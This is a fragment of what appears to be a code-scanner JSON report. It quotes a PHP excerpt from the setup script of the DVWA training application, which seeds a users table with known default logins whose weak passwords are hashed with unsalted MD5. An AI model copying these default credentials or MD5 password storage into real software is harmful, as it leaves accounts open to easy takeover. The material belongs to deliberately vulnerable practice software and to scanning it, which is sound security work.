        "excerpt": "$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n",
        "startLocationLine": 58,
        "startLocationColumn": 8,
        "endLocationLine": 58,
        "endLocationColumn": 12
      }
    ]
  }
}